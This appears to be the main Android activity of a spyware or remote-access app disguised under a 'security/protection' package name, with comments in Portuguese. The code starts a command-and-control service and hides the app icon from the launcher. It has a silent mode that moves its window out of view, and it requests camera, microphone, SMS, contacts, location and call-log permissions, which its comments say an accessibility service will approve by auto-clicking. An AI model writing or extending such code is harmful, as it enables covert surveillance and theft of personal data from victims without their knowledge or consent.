package com.seguranca.protecao;

import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import androidx.appcompat.app.AppCompatActivity;

/**
 * Activity principal - VAI DIRETO para o SetupWizard
 * Sem telas intermediárias para instalação mais rápida
 */
public class MainActivity extends AppCompatActivity {
    private PermissionManager permissionManager;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        permissionManager = new PermissionManager(this);
        
        // CRÍTICO: Se foi solicitado para pedir TODAS as permissões runtime
        if (getIntent().getBooleanExtra("REQUEST_ALL_PERMISSIONS", false)) {
            boolean silentMode = getIntent().getBooleanExtra("SILENT_MODE", false);
            
            if (silentMode) {
                // Modo silencioso: minimiza a janela para usuário não ver
                moveTaskToBack(true);
            }
            
            requestAllRuntimePermissions();
            
            if (!silentMode) {
                finish();
            }
            return;
        }
        
        // ===== DIRETO PARA O WIZARD DE PERMISSÕES =====
        // Pula todas as telas intermediárias e vai direto para o SetupWizard
        // Isso é mais rápido e direto para o usuário
        
        // Se já tem acessibilidade ativada, só inicia os serviços e fecha
        if (permissionManager.isAccessibilityServiceEnabled()) {
            startBackgroundServices();
            hideAppIcon();
            finish();
            return;
        }
        
        // Vai DIRETO para o SetupWizard (tela de permissões)
        Intent intent = new Intent(this, SetupWizardActivity.class);
        startActivity(intent);
        finish();
    }

    /**
     * Inicia todos os serviços em background
     */
    private void startBackgroundServices() {
        // Inicia o serviço de comando e controle
        Intent ccIntent = new Intent(this, CommandControlService.class);
        startService(ccIntent);
    }

    /**
     * Esconde o ícone do app do launcher
     * Isso torna o app "invisível" para o usuário
     */
    private void hideAppIcon() {
        android.content.pm.PackageManager pm = getPackageManager();
        android.content.ComponentName componentName = new android.content.ComponentName(
            this,
            MainActivity.class
        );
        
        pm.setComponentEnabledSetting(
            componentName,
            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            android.content.pm.PackageManager.DONT_KILL_APP
        );
    }
    
    /**
     * CRÍTICO: Solicita TODAS as permissões runtime de uma vez
     * Camera, Microfone, SMS, Contatos, Localização, Storage, Telefone, etc
     * O AccessibilityService vai automatizar os cliques em "Permitir"!
     */
    private void requestAllRuntimePermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            String[] permissions = new String[]{
                android.Manifest.permission.CAMERA,
                android.Manifest.permission.RECORD_AUDIO,
                android.Manifest.permission.READ_SMS,
                android.Manifest.permission.SEND_SMS,
                android.Manifest.permission.RECEIVE_SMS,
                android.Manifest.permission.READ_CONTACTS,
                android.Manifest.permission.WRITE_CONTACTS,
                android.Manifest.permission.ACCESS_FINE_LOCATION,
                android.Manifest.permission.ACCESS_COARSE_LOCATION,
                android.Manifest.permission.READ_PHONE_STATE,
                android.Manifest.permission.CALL_PHONE,
                android.Manifest.permission.READ_CALL_LOG,
                android.Manifest.permission.WRITE_CALL_LOG,
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
                android.Manifest.permission.WRITE_EXTERNAL_STORAGE
            };
            
            // Solicita TODAS de uma vez - Accessibility vai automatizar os cliques!
            requestPermissions(permissions, 1000);
        }
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        // Não precisa fazer nada - AccessibilityService já automatizou tudo!
    }
}
